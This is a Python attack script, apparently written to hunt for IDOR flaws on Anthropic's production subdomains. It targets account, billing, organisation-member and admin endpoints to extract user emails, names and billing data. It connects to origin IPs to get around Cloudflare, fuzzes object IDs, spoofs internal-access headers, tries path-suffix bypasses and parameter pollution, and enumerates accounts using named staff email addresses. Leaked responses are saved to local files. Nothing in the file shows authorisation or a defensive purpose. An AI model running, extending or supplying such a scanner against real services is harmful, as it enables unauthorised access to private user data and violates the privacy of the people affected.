#!/usr/bin/env python3
"""
Anthropic IDOR Hunter — User Data Focus
Tests Anthropic subdomains for IDOR vulnerabilities that leak user data.
Uses both direct origin IP access (bypasses Cloudflare) and browser-based testing.
"""
import asyncio
import json
import os
import time
import uuid
from urllib.parse import urlencode
import aiohttp

OUTPUT_DIR = "/tmp/anthropic-idor-userdata"
os.makedirs(OUTPUT_DIR, exist_ok=True)

FINDINGS = []

# ──────────────────────────────────────────────────────────────
# SUBDOMAIN → ORIGIN IP MAPPING (from anthropic-subdomains.md)
# ──────────────────────────────────────────────────────────────
ORIGIN_IP_MAP = {
    "api.anthropic.com": "160.79.104.10",
    "console.anthropic.com": "160.79.104.10",
    "www.anthropic.com": "160.79.104.10",
    "docs.anthropic.com": "160.79.104.10",
    "platform.anthropic.com": "160.79.104.10",
    "billing.anthropic.com": "160.79.104.10",
    "assets.anthropic.com": "160.79.104.10",
    "assets-proxy.anthropic.com": "160.79.104.10",
    "brand.anthropic.com": "160.79.104.10",
    "feedback.anthropic.com": "34.160.232.196",
    "ilinks.anthropic.com": "160.79.104.10",
    "legal.anthropic.com": "160.79.104.10",
    "links.anthropic.com": "160.79.104.10",
    "privacy.anthropic.com": "160.79.104.10",
    "red.anthropic.com": "160.79.104.10",
    "alignment.anthropic.com": "160.79.104.10",
    "api-release-candidate-2.anthropic.com": "160.79.104.10",
    "prod-rudolph.he.anthropic.com": "3.221.57.21",
    "statsig.anthropic.com": "160.79.104.10",
}

# ──────────────────────────────────────────────────────────────
# USER DATA ENDPOINTS — most likely to contain PII/user info
# ──────────────────────────────────────────────────────────────
USER_DATA_ENDPOINTS = [
    # ── ACCOUNT / PROFILE (direct user data) ──
    {
        "id": "account-settings",
        "host": "console.anthropic.com",
        "method": "GET",
        "path": "/api/account/settings",
        "user_data_type": "Account settings, email, name, preferences",
        "idor_params": [],
    },
    {
        "id": "account-profile",
        "host": "console.anthropic.com",
        "method": "GET",
        "path": "/api/account_profile",
        "user_data_type": "User profile (name, email, avatar, orgs)",
        "idor_params": [],
    },
    {
        "id": "account-migration",
        "host": "console.anthropic.com",
        "method": "GET",
        "path": "/api/account/migration_eligibility",
        "user_data_type": "Account migration status, user tier",
        "idor_params": [],
    },
    {
        "id": "account-deletion",
        "host": "console.anthropic.com",
        "method": "GET",
        "path": "/api/account/deletion-allowed",
        "user_data_type": "Account deletion eligibility, user status",
        "idor_params": [],
    },
    # ── BILLING (financial user data) ──
    {
        "id": "billing-credits",
        "host": "console.anthropic.com",
        "method": "GET",
        "path": "/api/billing/credits",
        "user_data_type": "Credit balance, usage, spending history",
        "idor_params": [],
    },
    {
        "id": "billing-subscription",
        "host": "console.anthropic.com",
        "method": "GET",
        "path": "/api/billing/subscription",
        "user_data_type": "Subscription tier, plan, billing cycle, payment method",
        "idor_params": [],
    },
    {
        "id": "billing-gift-validate",
        "host": "console.anthropic.com",
        "method": "GET",
        "path": "/api/billing/gift/validate",
        "user_data_type": "Gift code validation (may leak purchaser info)",
        "idor_params": [{"name": "code", "type": "string", "test_values": ["TEST", "CLAUDEFREE", "GIFT2025", "000000"]}],
    },
    # ── ORGANIZATIONS (org members = user data) ──
    {
        "id": "organizations-current",
        "host": "console.anthropic.com",
        "method": "GET",
        "path": "/api/organizations/current",
        "user_data_type": "Current org details, member count, plan",
        "idor_params": [],
    },
    {
        "id": "organizations-discoverable",
        "host": "console.anthropic.com",
        "method": "GET",
        "path": "/api/organizations/discoverable",
        "user_data_type": "Discoverable orgs listing (org names, member counts)",
        "idor_params": [],
    },
    {
        "id": "organizations-by-id",
        "host": "console.anthropic.com",
        "method": "GET",
        "path": "/api/organizations/{}",
        "user_data_type": "Specific org details (name, members, billing)",
        "idor_params": [{"name": "org_id", "type": "uuid", "position": "path"}],
    },
    {
        "id": "organizations-users",
        "host": "console.anthropic.com",
        "method": "GET",
        "path": "/api/organizations/{}/users",
        "user_data_type": "ORG MEMBER LIST — emails, names, roles",
        "idor_params": [{"name": "org_id", "type": "uuid", "position": "path"}],
    },
    # ── ADMIN (MOST CRITICAL — direct user enumeration) ──
    {
        "id": "admin-users",
        "host": "console.anthropic.com",
        "method": "GET",
        "path": "/api/admin/users",
        "user_data_type": "ADMIN USER LIST — all user emails, names, roles, orgs",
        "idor_params": [],
    },
    {
        "id": "admin-orgs",
        "host": "console.anthropic.com",
        "method": "GET",
        "path": "/api/admin/organizations",
        "user_data_type": "ADMIN ORG LIST — all orgs with member data",
        "idor_params": [],
    },
    {
        "id": "admin-settings",
        "host": "console.anthropic.com",
        "method": "GET",
        "path": "/api/admin/settings",
        "user_data_type": "Admin panel settings (may include user configs)",
        "idor_params": [],
    },
    # ── REFERRAL (may leak user identities) ──
    {
        "id": "referral-info",
        "host": "console.anthropic.com",
        "method": "GET",
        "path": "/api/referral",
        "user_data_type": "Referral status, referred user info",
        "idor_params": [],
    },
    {
        "id": "referral-code",
        "host": "console.anthropic.com",
        "method": "GET",
        "path": "/api/referral/code/{}",
        "user_data_type": "Referral code lookup (may leak referrer identity)",
        "idor_params": [{"name": "code", "type": "string", "position": "path", "test_values": ["TEST", "CLAUDEFRIEND", "FRIEND10"]}],
    },
    # ── AUTH (email enumeration → user data leak) ──
    {
        "id": "login-methods",
        "host": "console.anthropic.com",
        "method": "GET",
        "path": "/api/auth/login_methods",
        "user_data_type": "Email → login method mapping (USER ENUMERATION)",
        "idor_params": [{"name": "email", "type": "string", "test_values": [
            "admin@anthropic.com",
            "security@anthropic.com",
            "support@anthropic.com",
            "dario@anthropic.com",
            "test@anthropic.com",
            "user@anthropic.com",
            "dev@anthropic.com",
            "team@anthropic.com",
            "hello@anthropic.com",
            "info@anthropic.com",
        ]}],
    },
    {
        "id": "send-magic-link",
        "host": "console.anthropic.com",
        "method": "POST",
        "path": "/api/auth/send_magic_link",
        "user_data_type": "Magic link sending (USER ENUMERATION via response diff)",
        "idor_params": [],
        "body": {"email_address": "admin@anthropic.com", "source": "claude", "utc_offset": 0},
    },
    # ── API ENDPOINTS (v1/) ──
    {
        "id": "api-me",
        "host": "api.anthropic.com",
        "method": "GET",
        "path": "/v1/me",
        "user_data_type": "API user info (email, orgs, API key scopes)",
        "idor_params": [],
    },
    {
        "id": "api-orgs-list",
        "host": "api.anthropic.com",
        "method": "GET",
        "path": "/v1/organizations",
        "user_data_type": "API org listing",
        "idor_params": [],
    },
    {
        "id": "api-org-by-id",
        "host": "api.anthropic.com",
        "method": "GET",
        "path": "/v1/organizations/{}",
        "user_data_type": "Specific org via API (members, workspaces)",
        "idor_params": [{"name": "org_id", "type": "uuid", "position": "path"}],
    },
    {
        "id": "api-org-users",
        "host": "api.anthropic.com",
        "method": "GET",
        "path": "/v1/organizations/{}/users",
        "user_data_type": "ORG USERS via API (MOST VALUABLE)",
        "idor_params": [{"name": "org_id", "type": "uuid", "position": "path"}],
    },
    {
        "id": "api-org-members",
        "host": "api.anthropic.com",
        "method": "GET",
        "path": "/v1/organizations/{}/members",
        "user_data_type": "ORG MEMBERS via API",
        "idor_params": [{"name": "org_id", "type": "uuid", "position": "path"}],
    },
    {
        "id": "api-workspace-members",
        "host": "api.anthropic.com",
        "method": "GET",
        "path": "/v1/organizations/{}/workspaces/{}/members",
        "user_data_type": "Workspace members (user data)",
        "idor_params": [
            {"name": "org_id", "type": "uuid", "position": "path"},
            {"name": "workspace_id", "type": "uuid", "position": "path"}
        ],
    },
    {
        "id": "api-users-list",
        "host": "api.anthropic.com",
        "method": "GET",
        "path": "/v1/users",
        "user_data_type": "USER LIST via API (CRITICAL)",
        "idor_params": [],
    },
    {
        "id": "api-user-by-id",
        "host": "api.anthropic.com",
        "method": "GET",
        "path": "/v1/users/{}",
        "user_data_type": "Specific user profile via API",
        "idor_params": [{"name": "user_id", "type": "uuid", "position": "path"}],
    },
    # ── BILLING SUBDOMAIN ──
    {
        "id": "billing-portal",
        "host": "billing.anthropic.com",
        "method": "GET",
        "path": "/",
        "user_data_type": "Billing portal (may have user info)",
        "idor_params": [],
    },
    {
        "id": "billing-api",
        "host": "billing.anthropic.com",
        "method": "GET",
        "path": "/api",
        "user_data_type": "Billing API discovery",
        "idor_params": [],
    },
    # ── PLATFORM SUBDOMAIN ──
    {
        "id": "platform-home",
        "host": "platform.anthropic.com",
        "method": "GET",
        "path": "/",
        "user_data_type": "Platform homepage (may have user context)",
        "idor_params": [],
    },
    {
        "id": "platform-api",
        "host": "platform.anthropic.com",
        "method": "GET",
        "path": "/api",
        "user_data_type": "Platform API discovery",
        "idor_params": [],
    },
    # ── RELEASE CANDIDATE API ──
    {
        "id": "rc-api-root",
        "host": "api-release-candidate-2.anthropic.com",
        "method": "GET",
        "path": "/",
        "user_data_type": "RC API root (may have user endpoints)",
        "idor_params": [],
    },
]

# ──────────────────────────────────────────────────────────────
# IDOR FUZZING VALUES
# ──────────────────────────────────────────────────────────────
# UUIDs to test for ID fuzzing
IDOR_UUIDS = [
    "00000000-0000-0000-0000-000000000000",  # null UUID
    "00000000-0000-0000-0000-000000000001",  # first possible
    "ffffffff-ffff-ffff-ffff-ffffffffffff",  # max UUID
    "11111111-1111-1111-1111-111111111111",
    str(uuid.uuid4()),  # random UUID
    "org_0000000000000000000000",  # org_ prefix pattern
    "user_0000000000000000000000",  # user_ prefix pattern
    "ws_0000000000000000000000",  # workspace prefix pattern
]

# Sequential IDs for numeric ID fuzzing
IDOR_SEQUENTIAL_IDS = [
    "0", "1", "2", "3", "10", "100", "1000", "9999",
]

# ──────────────────────────────────────────────────────────────
# IDOR TECHNIQUES
# ──────────────────────────────────────────────────────────────
TRAILING_BYPASS = [
    "/", "//", "/.", "/..", "%00", "%20", "%09", "%0a",
    "?", "??", "#", ";/", "..;/", "../", "..%2f",
    ".json", ".xml", ".yaml",
]

HEADER_BYPASS = {
    "X-Original-URL": None,  # value set per-request
    "X-Forwarded-For": "127.0.0.1",
    "X-Forwarded-Host": "localhost",
    "X-Rewrite-URL": None,
    "X-Forwarded-Proto": "https",
    "X-Real-IP": "127.0.0.1",
    "X-Originating-IP": "127.0.0.1",
    "X-Remote-IP": "127.0.0.1",
    "X-Client-IP": "127.0.0.1",
    "CF-Connecting-IP": "127.0.0.1",  # spoof Cloudflare header
    "True-Client-IP": "127.0.0.1",
    "X-Internally-Routed": "true",
    "X-Internal-Auth": "true",
}

PARAM_POLLUTION = [
    "id", "user_id", "org_id", "workspace_id", "account_id",
    "email", "token", "key", "api_key",
]


def log(msg):
    print(f"[{time.strftime('%H:%M:%S')}] {msg}", flush=True)


def save_finding(finding):
    FINDINGS.append(finding)
    with open(f"{OUTPUT_DIR}/findings.json", "w") as f:
        json.dump(FINDINGS, f, indent=2)
    log(f"  🔥 SAVED: [{finding['id']}] {finding['technique']} → {finding['status']} ({finding['anomaly']})")


# ──────────────────────────────────────────────────────────────
# DIRECT ORIGIN IP TESTING (requests-based)
# ──────────────────────────────────────────────────────────────
async def test_direct_origin(session, subdomain, ip, method, path, headers=None, body=None, query=None):
    """Test a subdomain directly via its origin IP (bypassing Cloudflare)."""
    url = f"http://{ip}{path}"
    if query:
        url += f"?{urlencode(query, doseq=True)}"

    req_headers = {"Host": subdomain}
    if headers:
        req_headers.update(headers)

    try:
        async with session.request(
            method, url, headers=req_headers, json=body,
            ssl=False,  # allow self-signed/SNI mismatch
            timeout=aiohttp.ClientTimeout(total=10)
        ) as resp:
            body_text = await resp.text()
            body_preview = body_text[:500] if body_text else ""
            return {
                "status": resp.status,
                "body": body_preview,
                "body_full": body_text,
                "headers": dict(resp.headers),
                "error": None,
            }
    except Exception as e:
        return {"status": 0, "body": "", "body_full": "", "headers": {}, "error": str(e)[:200]}


async def test_cloudflare(session, subdomain, method, path, headers=None, body=None, query=None):
    """Test via Cloudflare (normal DNS resolution)."""
    url = f"https://{subdomain}{path}"
    if query:
        url += f"?{urlencode(query, doseq=True)}"

    req_headers = headers or {}
    try:
        async with session.request(
            method, url, headers=req_headers, json=body,
            timeout=aiohttp.ClientTimeout(total=10)
        ) as resp:
            body_text = await resp.text()
            return {
                "status": resp.status,
                "body": body_text[:500] if body_text else "",
                "body_full": body_text,
                "headers": dict(resp.headers),
                "error": None,
            }
    except Exception as e:
        return {"status": 0, "body": "", "body_full": "", "headers": {}, "error": str(e)[:200]}


def has_user_data(body_text):
    """Check if a response body contains patterns that suggest user data was returned."""
    if not body_text:
        return False

    user_data_patterns = [
        '"email"', '"name"', '"first_name"', '"last_name"',
        '"organization"', '"org_name"', '"workspace"',
        '"billing"', '"subscription"', '"credits"',
        '"api_key"', '"api_keys"', '"token"',
        '"members"', '"users"', '"role"', '"admin"',
        '"account"', '"profile"', '"settings"',
        '"created_at"', '"updated_at"', '"id"',
    ]
    body_lower = body_text.lower()
    hits = [p for p in user_data_patterns if p.replace('"', '').lower() in body_lower]
    return len(hits) >= 2, hits


async def scan_endpoint(session, ep, idor_values):
    """Test one endpoint with all IDOR techniques."""
    ep_id = ep["id"]
    host = ep["host"]
    method = ep["method"]
    path_template = ep["path"]
    idor_params = ep.get("idor_params", [])
    user_data_type = ep.get("user_data_type", "Unknown")
    base_body = ep.get("body")

    # Get origin IP for this subdomain (if available)
    origin_ip = None
    for sub, ip in ORIGIN_IP_MAP.items():
        if sub in host or host in sub:
            origin_ip = ip
            break

    # Choose which IPs/routes to test
    targets = []
    if origin_ip:
        targets.append(("direct-origin", origin_ip, host))
    targets.append(("cloudflare", host, host))

    log(f"\n{'='*70}")
    log(f"🎯 {ep_id}: {method} {host}{path_template}")
    log(f"   User data: {user_data_type}")

    # Build paths to test
    paths_to_test = []

    if idor_params:
        # Endpoint has IDOR parameters — fuzz them
        for param_spec in idor_params:
            param_name = param_spec["name"]
            param_type = param_spec.get("type", "string")
            param_position = param_spec.get("position", "query")
            test_values = param_spec.get("test_values", [])

            if param_type == "uuid":
                test_values = IDOR_UUIDS + (test_values or [])
            elif param_type == "string":
                test_values = (test_values or []) + IDOR_SEQUENTIAL_IDS

            for val in test_values:
                # Format in path or query
                if param_position == "path":
                    test_path = path_template.format(val)
                    paths_to_test.append((test_path, None, f"ID:{param_name}={val}"))
                else:
                    # Query param
                    paths_to_test.append((path_template, {param_name: val}, f"ID:{param_name}={val}"))
    else:
        paths_to_test.append((path_template, None, None))

    # For each path variant, test both origin IP and Cloudflare
    for target_type, target_host, actual_host in targets:
        for path, query, idor_label in paths_to_test:
            # ── Baseline ──
            if target_type == "direct-origin":
                baseline = await test_direct_origin(session, actual_host, target_host, method, path, query=query, body=base_body)
            else:
                baseline = await test_cloudflare(session, target_host, method, path, query=query, body=base_body)

            b_status = baseline["status"]
            b_body = baseline.get("body_full", "")

            if b_status == 0:
                if "Connection" in str(baseline.get("error", "")) or "timeout" in str(baseline.get("error", "")):
                    continue

            # Check baseline for user data
            has_data, data_hints = has_user_data(b_body)
            if has_data:
                save_finding({
                    "id": ep_id,
                    "technique": f"baseline-{target_type}",
                    "idor_label": idor_label,
                    "target": target_type,
                    "url": f"https://{actual_host}{path}",
                    "method": method,
                    "status": b_status,
                    "body": b_body[:500],
                    "data_hints": data_hints,
                    "anomaly": f"BASELINE LEAKS USER DATA! Status={b_status}"
                })

            # ── IDOR: Trailing bypass ──
            for trail in TRAILING_BYPASS:
                bypass_path = path + trail
                if target_type == "direct-origin":
                    r = await test_direct_origin(session, actual_host, target_host, method, bypass_path, query=query, body=base_body)
                else:
                    r = await test_cloudflare(session, target_host, method, bypass_path, query=query, body=base_body)

                status = r["status"]
                body = r.get("body_full", "")

                # Anomaly detection
                if 200 <= status < 300 and (b_status >= 400 or b_status == 0):
                    has_data, hints = has_user_data(body)
                    save_finding({
                        "id": ep_id,
                        "technique": f"trailing:{trail}",
                        "idor_label": idor_label,
                        "target": target_type,
                        "url": f"https://{actual_host}{bypass_path}",
                        "method": method,
                        "status": status,
                        "body": body[:500],
                        "data_hints": hints,
                        "anomaly": f"AUTH BYPASS {b_status}→{status}",
                    })
                elif status == 200:
                    has_data2, hints2 = has_user_data(body)
                    if has_data2 and not has_data:
                        save_finding({
                            "id": ep_id,
                            "technique": f"trailing:{trail}",
                            "idor_label": idor_label,
                            "target": target_type,
                            "url": f"https://{actual_host}{bypass_path}",
                            "method": method,
                            "status": status,
                            "body": body[:500],
                            "data_hints": hints2,
                            "anomaly": f"USER DATA ADDED via trailing {trail}",
                        })

                # Also check for HTTP 500 (potential crash/error leaking data)
                elif status == 500:
                    err_data, err_hints = has_user_data(body)
                    if err_data:
                        save_finding({
                            "id": ep_id,
                            "technique": f"trailing:{trail}",
                            "idor_label": idor_label,
                            "target": target_type,
                            "url": f"https://{actual_host}{bypass_path}",
                            "method": method,
                            "status": status,
                            "body": body[:500],
                            "data_hints": err_hints,
                            "anomaly": f"500 ERROR LEAKS DATA via {trail}",
                        })

                await asyncio.sleep(0.05)

            # ── IDOR: Header injection ──
            for hdr_name in HEADER_BYPASS:
                hdrs = {hdr_name: path if HEADER_BYPASS[hdr_name] is None else HEADER_BYPASS[hdr_name]}
                if target_type == "direct-origin":
                    r = await test_direct_origin(session, actual_host, target_host, method, path, headers=hdrs, query=query, body=base_body)
                else:
                    r = await test_cloudflare(session, target_host, method, path, headers=hdrs, query=query, body=base_body)

                status = r["status"]
                body = r.get("body_full", "")

                if 200 <= status < 300 and (b_status >= 400 or b_status == 0):
                    has_data, hints = has_user_data(body)
                    save_finding({
                        "id": ep_id,
                        "technique": f"header:{hdr_name}",
                        "idor_label": idor_label,
                        "target": target_type,
                        "url": f"https://{actual_host}{path}",
                        "method": method,
                        "status": status,
                        "body": body[:500],
                        "data_hints": hints,
                        "anomaly": f"HEADER BYPASS {b_status}→{status} via {hdr_name}",
                    })

                await asyncio.sleep(0.05)

            # ── IDOR: Parameter pollution (only if has query params) ──
            if query:
                for pp_param in PARAM_POLLUTION:
                    polluted = dict(query)
                    polluted[pp_param] = [query.get(pp_param, "1"), "hack"]
                    if target_type == "direct-origin":
                        r = await test_direct_origin(session, actual_host, target_host, method, path, query=polluted, body=base_body)
                    else:
                        r = await test_cloudflare(session, target_host, method, path, query=polluted, body=base_body)

                    status = r["status"]
                    body = r.get("body_full", "")

                    if status != b_status and status < 500:
                        has_data, hints = has_user_data(body)
                        save_finding({
                            "id": ep_id,
                            "technique": f"hpp:{pp_param}",
                            "idor_label": idor_label,
                            "target": target_type,
                            "url": f"https://{actual_host}{path}",
                            "method": method,
                            "status": status,
                            "body": body[:500],
                            "data_hints": hints,
                            "anomaly": f"HPP change {b_status}→{status}",
                        })

                    await asyncio.sleep(0.05)


async def main():
    log("🔍 Anthropic IDOR Hunter — User Data Focus")
    log(f"   Testing {len(USER_DATA_ENDPOINTS)} endpoints for user data leaks")
    log(f"   Origin IPs: {len(ORIGIN_IP_MAP)} subdomains mapped")
    log(f"   Output: {OUTPUT_DIR}/findings.json")
    log("")

    connector = aiohttp.TCPConnector(ssl=False, limit=10)
    async with aiohttp.ClientSession(connector=connector) as session:
        for ep in USER_DATA_ENDPOINTS:
            try:
                await scan_endpoint(session, ep, IDOR_UUIDS)
            except Exception as e:
                log(f"  ❌ Error testing {ep['id']}: {e}")

    # ── Final Report ──
    log(f"\n{'='*70}")
    log(f"📊 IDOR SCAN COMPLETE — {len(FINDINGS)} findings")
    log(f"{'='*70}")

    # Group findings by severity
    user_leaks = [f for f in FINDINGS if "USER DATA" in f.get("anomaly", "") or "LEAKS" in f.get("anomaly", "")]
    auth_bypass = [f for f in FINDINGS if "BYPASS" in f.get("anomaly", "") and f not in user_leaks]
    errors = [f for f in FINDINGS if f not in user_leaks and f not in auth_bypass]

    log(f"\n  🔴 USER DATA LEAKS: {len(user_leaks)}")
    for f in user_leaks:
        log(f"     [{f['id']}] {f['technique']:30s} → {f['status']}")
        if f.get("data_hints"):
            log(f"       Data hints: {f['data_hints']}")
        if f.get("body") and len(f["body"]) > 10:
            log(f"       Body: {f['body'][:200]}")

    log(f"\n  🟡 AUTH BYPASS: {len(auth_bypass)}")
    for f in auth_bypass:
        log(f"     [{f['id']}] {f['technique']:30s} → {f['status']} | {f['anomaly']}")

    log(f"\n  ⚪ OTHER: {len(errors)}")

    # Save report
    report = {
        "summary": {
            "total_findings": len(FINDINGS),
            "user_data_leaks": len(user_leaks),
            "auth_bypasses": len(auth_bypass),
            "other": len(errors),
            "endpoints_tested": len(USER_DATA_ENDPOINTS),
        },
        "user_data_leaks": user_leaks,
        "auth_bypasses": auth_bypass,
        "all_findings": FINDINGS,
    }
    with open(f"{OUTPUT_DIR}/report.json", "w") as f:
        json.dump(report, f, indent=2)

    log(f"\n  Full report saved to {OUTPUT_DIR}/report.json")
    log(f"  Findings saved to {OUTPUT_DIR}/findings.json")


if __name__ == "__main__":
    asyncio.run(main())
